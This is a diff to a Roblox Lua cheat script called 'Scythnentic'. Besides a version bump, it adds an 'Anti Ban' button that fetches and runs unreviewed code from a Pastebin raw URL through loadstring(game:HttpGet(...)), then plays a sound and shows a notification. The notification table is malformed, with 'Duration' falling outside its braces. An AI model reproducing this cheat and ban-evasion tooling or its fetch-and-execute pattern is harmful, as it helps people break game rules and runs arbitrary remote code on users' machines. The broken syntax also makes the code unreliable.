@@ -5,7 +5,7 @@
 
 -- // Api Load \\ --
 local cheatname = "                                                    Scythnentic"
-local version = "Interiumized REWRITE | V2"
+local version = "Interiumized REWRITE | V2.1"
 
      local sound = Instance.new("Sound", Workspace)
      sound.Pitch = 1 -- Speed of the song (Preffer not to change it)
@@ -606,6 +606,25 @@ local CreateButton = Page:CreateButton("Anti Afk", "Snooze freely", function(Afk
     game:GetService("StarterGui"):SetCore("SendNotification", { 
         Title = "SCYTHNENTIC";
         Text = "Anti'd AFKing";
+        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
+        Duration = 3;
+        wait(5)
+    sound2:Destroy()
+    end
+end)
+local CreateButton = Page:CreateButton("Anti Ban", "Cheatr", function(AB)
+    getgenv().AB = AB
+        task.wait() do
+        local AB = getgenv().AB
+        loadstring(game:HttpGet(('https://pastebin.com/raw/vDA45t0N'),true))();   
+        local sound2 = Instance.new("Sound", Workspace)
+        sound2.Parent = game.Workspace
+        sound2.SoundId = "rbxassetid://1637297605"
+        sound2.Volume = 1
+        sound2:Play()
+    game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "SCYTHNENTIC";
+        Text = "Anti'd Bans";
         Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
         Duration = 3;
         wait(5)
